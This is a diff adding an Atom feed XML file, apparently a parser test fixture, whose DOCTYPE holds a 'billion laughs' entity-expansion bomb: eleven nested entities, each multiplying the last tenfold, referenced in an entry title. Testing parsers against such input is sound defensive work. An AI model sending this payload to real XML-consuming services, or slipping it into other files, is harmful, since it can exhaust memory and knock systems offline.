@@ -1,0 +1,29 @@
+<!DOCTYPE feed [
+ <!ENTITY a0 "bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!bomb!">
+ <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+ <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+ <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+ <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+ <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+ <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+ <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+ <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+ <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
+ <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
+ <!ENTITY bomb "&a10;&a10;">
+]>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <title>example</title>
+    <updated>2013-06-24T11:56:27+09:00</updated>
+    <id>example</id>
+    <entry>
+      <title>hello &bomb;</title>
+      <link href="http://example.com/" />
+      <id>http://example.com/1</id>
+      <updated>2013-06-26T11:56:27+09:00</updated>
+      <summary>...</summary>
+      <author>
+        <name>example</name>
+      </author>
+    </entry>
+</feed>
